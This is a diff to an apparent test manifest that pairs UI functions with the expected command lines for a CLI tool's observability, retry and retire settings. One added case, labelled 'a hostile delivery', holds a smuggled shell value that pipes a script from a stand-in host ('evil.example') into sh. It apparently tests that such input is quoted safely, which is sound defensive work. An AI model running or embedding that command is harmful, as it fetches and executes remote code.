@@ -7,7 +7,7 @@
     },
     {
       "path": "ui/shared/src/assurance/assuranceCommands.ts",
-      "sha256": "6427846445035d39e5c8569016d86e56151e224bb5b734fad2a6fa2b6a1927c2"
+      "sha256": "d8a89cfbf412f7b67f5289b9cae9615b6e38af7a3d8ad2300531bade480b0afe"
     },
     {
       "path": "ui/shared/src/assurance/validatorCommands.ts",
@@ -20,6 +20,10 @@
     {
       "path": "ui/shared/src/hooks/runCommands.ts",
       "sha256": "5c277b88a537cdfc2f2c63aaf47b66f6487e29c42dcc5641d5c658c1d3376048"
+    },
+    {
+      "path": "ui/shared/src/observability/observabilityCommands.ts",
+      "sha256": "484f4e110cc4f02fb2531b8ba540458368173070c9847dfa240d3e743c4f90da"
     },
     {
       "path": "ui/shared/src/pages/destinationConfigureCommands.ts",
@@ -35,7 +39,7 @@
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "5ad070c8fe369bf04039b2e71f465a3774d330b293da8a9e9bc43c7d45b718f6"
+      "sha256": "e8b761cce9b3b45c2baefaff69fc52b9150977619ef2e2625e34930abf8ae484"
     }
   ],
   "twins": [
@@ -128,6 +132,12 @@
       "fn": "retryCommand",
       "case": "one backup",
       "line": "retnd retry api-server/var-backups/dump-2026-10-01.tar.gz"
+    },
+    {
+      "module": "assurance/assuranceCommands",
+      "fn": "retireCommand",
+      "case": "one backup",
+      "line": "retnd retire api-server/var-backups/dump-2026-10-01.tar.gz"
     },
     {
       "module": "assurance/assuranceCommands",
@@ -704,6 +714,138 @@
       "fn": "noticeCommand",
       "case": "any other outcome, every set",
       "line": "retnd operation run"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsEnabledCommand",
+      "case": "turning it on",
+      "line": "retnd settings observability patch --metrics-enabled=true"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsEnabledCommand",
+      "case": "turning it off",
+      "line": "retnd settings observability patch --metrics-enabled=false"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsIntervalCommand",
+      "case": "half a minute",
+      "line": "retnd settings observability patch --metrics-min-rebuild-interval 30s"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsIntervalCommand",
+      "case": "a minute and a half",
+      "line": "retnd settings observability patch --metrics-min-rebuild-interval 1m30s"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsIntervalCommand",
+      "case": "an hour and ten seconds",
+      "line": "retnd settings observability patch --metrics-min-rebuild-interval 1h10s"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "metricsIntervalCommand",
+      "case": "a whole hour",
+      "line": "retnd settings observability patch --metrics-min-rebuild-interval 1h"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "mintScrapeTokenCommand",
+      "case": "the mint",
+      "line": "retnd settings observability rotate-scrape-token"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "logsLevelCommand",
+      "case": "the debug floor",
+      "line": "retnd settings observability patch --logs-level debug"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "logsLevelCommand",
+      "case": "the info floor",
+      "line": "retnd settings observability patch --logs-level info"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "logsLevelCommand",
+      "case": "the warn floor",
+      "line": "retnd settings observability patch --logs-level warn"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "logsLevelCommand",
+      "case": "the error floor",
+      "line": "retnd settings observability patch --logs-level error"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "the platform notifier",
+      "line": "retnd settings observability patch --alerts-delivery platform"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "a webhook",
+      "line": "retnd settings observability patch --alerts-delivery webhook"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "a hostile delivery",
+      "line": "retnd settings observability patch --alerts-delivery 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookDialectCommand",
+      "case": "one object per alert",
+      "line": "retnd settings observability patch --webhook-dialect generic"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookDialectCommand",
+      "case": "the Alertmanager array",
+      "line": "retnd settings observability patch --webhook-dialect alertmanager"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookAllowInsecureHttpCommand",
+      "case": "plain http allowed",
+      "line": "retnd settings observability patch --webhook-allow-insecure-http=true"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookAllowInsecureHttpCommand",
+      "case": "plain http refused",
+      "line": "retnd settings observability patch --webhook-allow-insecure-http=false"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookRefreshIntervalCommand",
+      "case": "the default four minutes",
+      "line": "retnd settings observability patch --webhook-refresh-interval 4m"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookRefreshIntervalCommand",
+      "case": "a minute and a half",
+      "line": "retnd settings observability patch --webhook-refresh-interval 1m30s"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookResolveTtlCommand",
+      "case": "the default ten minutes",
+      "line": "retnd settings observability patch --webhook-resolve-ttl 10m"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookResolveTtlCommand",
+      "case": "an hour and ten seconds",
+      "line": "retnd settings observability patch --webhook-resolve-ttl 1h10s"
     },
     {
       "module": "pages/destinationConfigureCommands",
